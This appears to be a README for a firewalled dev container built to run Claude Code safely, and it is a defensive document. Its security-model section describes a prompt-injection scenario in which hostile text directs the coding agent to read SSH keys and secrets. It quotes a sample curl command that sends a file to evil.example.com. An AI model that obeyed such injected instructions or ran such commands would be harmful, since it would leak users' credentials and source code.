# Dev Container: Hardened Python Environment with Claude Code

This dev container provides an isolated, firewall-restricted development environment for Python projects. It is designed to be used with Neovim and Claude Code, with strong protections against prompt injection attacks that attempt to exfiltrate credentials or source code.

## Prerequisites

You need the following installed on your host machine:

- **Docker** (Docker Desktop or Docker Engine)
- **Dev Container CLI**: install with `npm install -g @devcontainers/cli`
- **Claude Code**: installed on your host system, specifically the `.claude/` directory and `.claude.json` file needs to be present
- **Neovim**: your existing Neovim config at `~/.config/nvim`, a default empty dir is created if it does not exist
- **AWS CLI**: needed to generate short-lived STS tokens for database access
- A `requirements/local.txt` in your project (for Python dependencies)

## Setup

### 1. Verify your project structure

After copying the dev container files, your project should look like this:

```
your-project/
├── .devcontainer/
│   ├── devcontainer.json
│   ├── Dockerfile
│   ├── init-firewall.sh
│   ├── dev-container-helpers.sh
│   └── print-setup-hint.sh
├── requirements/
│   └── local.txt
└── ... your code ...
```

### 2. Ensure the Claude config directory exists on your host

The container mounts `~/.claude` from your host to persist authentication tokens. If this directory doesn't exist yet, create it:

```bash
mkdir -p ~/.claude
```

### 3. Create a shared notes directory

Create a `notes` directory as a sibling to your project repositories. This directory is mounted into every dev container at `/workspace/notes`, so your notes are available regardless of which service you're working in:

```
~/projects/
├── service-A/
├── another-service/
└── notes/              ← shared across all dev containers
```

```bash
mkdir -p ~/projects/notes
```

If you use Obsidian or another notes tool, you can point this to an existing vault — just make sure `NOTES_PATH` (below) points to the right directory. On WSL, this can be a Windows path like `/mnt/c/Users/YourName/Documents/MyVault/work-notes`.

### 4. Set required environment variables on your host

Add these to your `~/.bashrc` or `~/.zshrc`:

```bash
# Full path to your shared notes directory (sibling to your repos)
export NOTES_PATH="/home/yourusername/projects/notes"

# Full path to your EC2 SSH key (can be anywhere on your machine)
export EC2_KEY_PATH="/home/yourusername/path/to/your-ec2-key.pem"

# The EC2 bastion host (hostname or IP) for database tunneling
export EC2_HOST="ec2-xx-xx-xx-xx.compute-1.amazonaws.com"

# If your IAM user has MFA enabled (recommended)
export AWS_MFA_SERIAL="arn:aws:iam::123456789012:mfa/your-username"
```

### 5. Install the dev container helper script

Copy the helper script to a shared location and source it in your shell config. This only needs to be done once — the same script works across all projects that use this dev container setup.

```bash
cp .devcontainer/dev-container-helpers.sh ~/.local/bin/
echo '[ -f ~/.local/bin/dev-container-helpers.sh ] && source ~/.local/bin/dev-container-helpers.sh' >> ~/.bashrc
source ~/.bashrc
```

### 6. Build and start the container

From your project root:

```bash
dcup
```

This will build the Docker image (first run takes a few minutes), start the container, install your Python dependencies, and initialize the firewall. Watch the output — you should see the firewall verification checks pass at the end:

```
PASS: example.com is blocked
PASS: webhook.site is blocked
PASS: api.anthropic.com is reachable
PASS: EC2 bastion (ec2-xx-xx-xx-xx.compute-1.amazonaws.com) is reachable on port 22, this may fail due to timing issues
All checks passed. Container is locked down.
```

If any check fails, do not proceed. Review the firewall script output for errors.

### 7. Authenticate Claude Code

On first run, Claude Code will ask you to authenticate:

```bash
dcdanger
```

It will print a URL to your terminal. Copy that URL and open it in a browser on your host machine. Complete the OAuth flow in the browser. The token is stored in the mounted `~/.claude` directory, so you won't need to do this again unless the token expires.

### 8. Start working

Once authenticated, your daily workflow is:

```bash
cd your-project
dcup          # start the container
dcdanger      # launch Claude Code (with AWS creds injected)
dcnvim        # open Neovim (with AWS creds injected)
dcshell       # get a bash shell (with AWS creds injected)
dcrefresh     # manually refresh the STS token if it expires mid-session
```

The first time you run `dcdanger`, `dcnvim`, or `dcshell` in a terminal session, the helper script will call `aws sts get-session-token` to generate short-lived AWS credentials. If you have MFA enabled, it will prompt for your TOTP code. The token is cached in memory for the duration of your shell session (default: 4 hours) and injected into the container via environment variables on each exec — never written to disk.

### 9. Stopping and restarting

```bash
# Stop the container (preserves state)
docker stop $(docker ps -q --filter "label=devcontainer.local_folder=$(pwd)")

# Start it again (firewall re-initializes automatically)
dcup
```

### 10. Rebuilding after config changes

If you modify the Dockerfile, devcontainer.json, or init-firewall.sh:

```bash
devcontainer up --workspace-folder . --build-no-cache
```

and to delete the existing container:
```bash
devcontainer up --workspace-folder . --remove-existing-container --build-no-cache
```

---

## AWS Credentials: How It Works

The dev container does NOT mount `~/.aws` from your host. Instead, short-lived STS session tokens are generated on the host and passed into the container as environment variables.

The flow is:

1. You run `dcdanger` (or `dcnvim`, `dcshell`, etc.)
2. The helper script calls `aws sts get-session-token` on your host using your IAM user's long-lived credentials
3. If MFA is enabled, it prompts for your TOTP code
4. STS returns a temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
5. These are passed into the container via `env` on `devcontainer exec`
6. Boto3 picks them up automatically from environment variables

This means your long-lived IAM access keys never enter the container. The temporary credentials expire after a configurable duration (default: 4 hours, adjustable via `export DC_TOKEN_DURATION=28800` for 8 hours). Even if a prompt injection reads the environment variables inside the container, the egress firewall blocks any exfiltration attempt, and the credentials expire shortly after.

## EC2 SSH Tunnel: How It Works

The Flask app creates an SSH tunnel to an EC2 bastion host to reach the database. This requires two things inside the container:

1. **The EC2 SSH key**: mounted read-only from `~/.ssh/$EC2_KEY_NAME` on your host to `/home/dev/.ssh/ec2-key` inside the container. Only this single key is mounted — not your entire `~/.ssh` directory.
2. **Network access to the EC2 host**: the firewall whitelists `$EC2_HOST` alongside the other allowed domains.

The `EC2_PRIVATE_KEY_PATH` environment variable is set automatically in `devcontainer.json` to point to the mounted key, so no code changes are needed.

---

## Security Model

This dev container is hardened against a specific threat: **prompt injection attacks against agentic coding tools**. The scenario it protects against is as follows. You run Claude Code with `--dangerously-skip-permissions`, which allows it to execute shell commands without confirmation. During a task, Claude Code encounters a malicious prompt (embedded in a web page, package README, issue tracker, or any text it processes). That prompt instructs Claude Code to read sensitive files and exfiltrate them to an attacker-controlled server.

The container defends against this with two independent layers.

### Layer 1: No credentials to steal

The container only mounts what is strictly necessary:

| Mounted (accessible inside container) | Why |
|---|---|
| `~/.config/nvim` | Your Neovim configuration |
| `~/.local/share/nvim` | Neovim plugin and state data |
| `~/.claude` and `~/.claude.json` | Claude Code auth token and config |
| `~/.ssh/<EC2_KEY_NAME>` (read-only) | Single SSH key for database tunnel |
| Your project directory | Mounted as `/workspace` (this is your code) |
| Named volume for pip cache | Speeds up pip installs across rebuilds |

Everything else on your host is invisible to the container:

| NOT mounted (invisible inside container) | What it protects |
|---|---|
| `~/.ssh` (full directory) | All other SSH private keys |
| `~/.aws` | AWS access keys and session tokens |
| `~/.config/gcloud` | Google Cloud credentials |
| `~/.kube` | Kubernetes cluster credentials |
| `~/.gnupg` | GPG private keys |
| `~/.netrc` | Plaintext login credentials |
| `~/.env`, `.env` files | API keys, database passwords |

If a prompt injection runs `cat ~/.ssh/id_ed25519` inside the container, it gets "file not found." The file simply doesn't exist in the container's filesystem.

AWS credentials are passed as environment variables (not mounted files) and are short-lived STS tokens that expire within hours.

### Layer 2: Egress firewall (network lockdown)

Even though credentials aren't mounted, your **source code** is — it has to be, since that's what you're working on. The firewall prevents exfiltration of source code or any other data by restricting outbound network access to a strict whitelist.

The container can ONLY reach:

| Domain | Purpose |
|---|---|
| `api.anthropic.com` | Claude Code API calls |
| `sentry.io` | Claude Code error reporting (optional) |
| `statsig.anthropic.com` | Claude Code telemetry (optional) |
| `statsig.com` | Claude Code telemetry (optional) |
| `registry.npmjs.org` | Node package registry (optional) |
| `shorelineiot.atlassian.net` | Atlassian / Jira access |
| `$EC2_HOST` | SSH tunnel to database |
| Docker host network | Port forwarding (OAuth, app ports) |
| localhost | LSP servers, local tools |

All other outbound traffic is blocked and rejected. A prompt injection that tries `curl https://evil.example.com/exfil -d "$(cat /workspace/secrets.py)"` will fail immediately with a connection rejected error.

### What this does NOT protect against

No security setup is perfect. Be aware of these remaining risks:

**Source code modification.** A prompt injection can still modify your code — inserting backdoors, weakening security checks, or introducing subtle bugs. The firewall prevents exfiltration but not tampering. Always review changes before committing (which you do from the host).

**Claude auth token.** The `~/.claude` mount means a prompt injection could read your Claude Code auth token. The blast radius is limited to someone making API calls as you to Anthropic, which is much smaller than SSH or AWS credential theft.

**EC2 SSH key.** The mounted EC2 key is read-only and the firewall limits where SSH connections can go (only `$EC2_HOST`). A prompt injection cannot exfiltrate the key to an external server, but it could theoretically use it to SSH into the bastion host.

**Short-lived AWS credentials in environment.** A prompt injection could read the STS token from environment variables. However, the egress firewall blocks exfiltration, and the token expires within hours. This is a significant improvement over mounting long-lived `~/.aws` credentials.

**Container escape.** This setup assumes Docker's container isolation holds. Container escapes are rare but not impossible. The `NET_ADMIN` and `NET_RAW` capabilities required for the firewall are additional kernel capabilities granted to the container, though they are used here to restrict rather than expand access.

**DNS-based firewall limitations.** The firewall resolves domain names to IP addresses at container start time. If a whitelisted service (like `api.anthropic.com`) rotates its IPs during a long session, connections may break until the container is restarted. In practice this rarely matters for typical dev sessions.

**No internet research.** Because the firewall blocks general internet access, Claude Code cannot browse documentation, search the web, or fetch resources from arbitrary URLs. It operates using only its training knowledge and the contents of your project. If you need Claude to reference external information, look it up on your host and paste the relevant content into your prompt.

### The `--cap-add` flags explained

The `devcontainer.json` includes `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW`. These Docker capabilities allow the container to configure its own network — specifically, to run `iptables` and `ipset`. Without them, the firewall script would fail with "permission denied."

This might seem counterintuitive: you're granting extra capabilities to make the container *more* restrictive. The key distinction is that these capabilities allow the container to restrict its own outbound traffic. They do not grant the container any additional access to the host system or host network.

### The sudoers configuration explained

The Dockerfile grants the non-root `dev` user passwordless sudo access to exactly one command: `/usr/local/bin/init-firewall.sh`. This is configured via:

```
dev ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
```

This means the `dev` user cannot run arbitrary commands as root — only the firewall initialization script. The firewall must run as root because `iptables` requires it, but all other operations (Claude Code, Neovim, Python, your code) run as the unprivileged `dev` user.

### Adding domains to the whitelist

If you need the container to reach additional domains (for example, `pypi.org` for runtime pip installs, or specific documentation sites), edit the `ALLOWED_DOMAINS` array in `init-firewall.sh`:

```bash
ALLOWED_DOMAINS=(
    "api.anthropic.com"
    "sentry.io"
    "statsig.anthropic.com"
    "statsig.com"
    "registry.npmjs.org"
    # Add your domains below:
    "pypi.org"
    "files.pythonhosted.org"
)
```

Then restart the container so the firewall re-initializes with the new rules. Every domain you add is a potential vector for prompt injection content, so add only what you genuinely need.

---

## Helper Commands Reference

These commands are available after sourcing `dev-container-helpers.sh`:

| Command | Description |
|---|---|
| `dcup` | Start the dev container (optionally pass a workspace path) |
| `dcdanger` | Launch Claude Code with `--dangerously-skip-permissions` and AWS creds |
| `dcnvim` | Open Neovim with AWS creds injected |
| `dcshell` | Get a bash shell with AWS creds injected |
| `dcrefresh` | Force-refresh the cached STS token |
| `dcexec <cmd>` | Run any command inside the container with AWS creds |

### Configuration variables

Set these on your host before sourcing the helpers:

| Variable | Required | Description |
|---|---|---|
| `NOTES_PATH` | Yes | Full path to your shared notes directory |
| `EC2_KEY_PATH` | Yes | Full path to your EC2 SSH key file |
| `EC2_HOST` | Yes | EC2 bastion hostname or IP |
| `AWS_MFA_SERIAL` | No | Your IAM MFA device ARN (prompted for TOTP if set) |
| `DC_TOKEN_DURATION` | No | STS token lifetime in seconds (default: 14400 = 4 hours) |
| `DC_WORKSPACE` | No | Default workspace folder (default: current directory) |
| `AWS_DEFAULT_REGION` | No | AWS region (default: us-east-1) |
